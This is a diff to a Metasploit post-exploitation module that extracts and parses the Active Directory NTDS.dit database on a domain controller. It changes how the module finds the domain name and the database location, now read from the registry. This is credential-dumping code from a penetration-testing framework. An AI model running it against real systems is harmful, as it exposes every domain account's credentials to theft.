@@ -36,7 +36,7 @@ class Metasploit3 < Msf::Post
       unless ntds_file.nil?
         print_status "Repairing NTDS database after copy..."
         print_status repair_ntds(ntds_file)
-        realm = domain_name
+        realm = sysinfo["Domain"]
         ntds_parser = Metasploit::Framework::NTDS::Parser.new(client, ntds_file)
         ntds_parser.each_account do |ad_account|
           print_good ad_account.to_s
@@ -67,13 +67,16 @@ class Metasploit3 < Msf::Post
     database_file_path
   end
 
-  def domain_name
-    result = cmd_exec('cmd.exe', '/c systeminfo | findstr /B /C:"Domain"')
-    result.gsub!(/Domain:\s+/,'')
+  def is_domain_controller?
+    if ntds_location
+      file_exist?("#{ntds_location}\\ntds.dit")
+    else
+      false
+    end
   end
 
-  def is_domain_controller?
-    file_exist?('%SystemDrive%\Windows\ntds\ntds.dit')
+  def ntds_location
+    @ntds_location ||= registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\services\\NTDS\\Parameters\\","DSA Working Directory")
   end
 
   def ntdsutil_method
